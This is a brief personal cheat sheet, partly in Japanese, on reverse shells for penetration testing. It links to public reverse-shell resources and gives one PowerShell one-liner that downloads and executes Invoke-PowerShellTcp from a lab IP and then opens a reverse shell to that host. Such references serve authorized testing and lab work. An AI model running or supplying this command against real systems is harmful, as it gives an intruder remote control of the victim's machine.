# reverse_shell

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#reverse-shell-cheat-sheet

## php
pentestmonkey/php-reverse-shellが個人的に一番使いやすい

https://github.com/pentestmonkey/php-reverse-shell

## powershell
[Invoke-PowerShellTcp(nishang)](https://github.com/sanposhiho/MY_CHEAT_SHEET/blob/master/Windows/Invoke-PowerShellTcp.md)

```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.66.152:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.66.152 -Port 4242
```
